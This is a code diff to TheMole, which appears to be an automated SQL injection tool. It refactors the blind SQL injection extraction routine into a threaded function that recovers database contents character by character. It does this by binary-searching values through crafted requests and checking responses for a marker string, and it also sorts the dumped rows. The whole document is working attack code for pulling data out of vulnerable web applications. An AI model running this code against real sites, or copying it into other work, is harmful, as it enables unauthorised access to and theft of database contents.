@@ -26,6 +26,7 @@ from domanalyser import DomAnalyser,NeedleNotFound
 from dbmsmoles import DbmsMole, Mysql5Mole, PostgresMole
 from dbdump import DatabaseDump
 from threader import Threader
+from output import BlindSQLIOutput
 import sys, time
 
 class TheMole:
@@ -143,11 +144,8 @@ class TheMole:
         else:
             dump_result = []
             self.stop_query = False
-            #for i in range(int(result[0])):
-            #    if self.stop_query:
-            #        break
-            #    dump_result.append(self._generic_query_item(query_generator, i, result_parser))
             dump_result = self.threader.execute(int(result[0]), lambda i: self._generic_query_item(query_generator, i, result_parser))
+            dump_result.sort()
             return dump_result
 
     def get_databases(self, force_fetch=False):
@@ -295,7 +293,33 @@ class TheMole:
             else:
                 last = medio - 1
         return pri
-        
+    
+    # Finds a character in the tuple result
+    def _blind_query_character(self, query_fun, index, offset, output=None):
+        pri   = ord(' ')
+        last  = 126
+        index = index + 1
+        while True:
+            medio = (pri + last)//2
+            response = self.analyser.decode(
+                self.requester.request(
+                    self.generate_url(query_fun(index, medio, offset))
+                )
+            )
+            if self.needle in response:
+                pri = medio+1
+            else:
+                last = medio
+            if medio == last - 1:
+                output.set(chr(medio+1), index - 1)
+                return chr(medio+1)
+            else:
+                if pri == last:                
+                    output.set(chr(medio), index - 1)
+                    return chr(medio)   
+                else:
+                    output.set(chr(medio), index - 1)
+    
     def _blind_query(self, count_fun, length_fun, query_fun, offset=0, row_count=None):
         self.stop_query = False
         if count_fun is None:
@@ -318,36 +342,11 @@ class TheMole:
             )
             print('\r[+] Guessed length:', length)
             output=''
-            for i in range(1,length+1):
-                pri   = ord(' ')
-                last  = 126
-                curSize = len(output)
-                sys.stdout.write(' ')
-                sys.stdout.flush()
-                while curSize == len(output):
-                    if self.stop_query:
-                        return results
-                    medio = (pri + last)//2
-                    response = self.analyser.decode(
-                        self.requester.request(
-                            self.generate_url(query_fun(i, medio, row))
-                        )
-                    )
-                    if self.needle in response:
-                        pri = medio+1
-                    else:
-                        last = medio
-                    if medio == last - 1:
-                        sys.stdout.write('\b' + chr(medio+1))
-                        output += chr(medio+1)
-                    else:
-                        if pri == last:                
-                            sys.stdout.write('\b' + chr(medio))
-                            output += chr(medio)   
-                        else:
-                            sys.stdout.write('\b' + chr(medio))
-                    sys.stdout.flush()
-            print('')
+            sqli_output = BlindSQLIOutput(length)
+            if self.stop_query:
+                return results
+            output = ''.join(self.threader.execute(length, lambda i: self._blind_query_character(query_fun, i, row, sqli_output)))
+            sqli_output.finish()
             results.append(output.split(self._dbms_mole.blind_field_delimiter()))
         return results
 
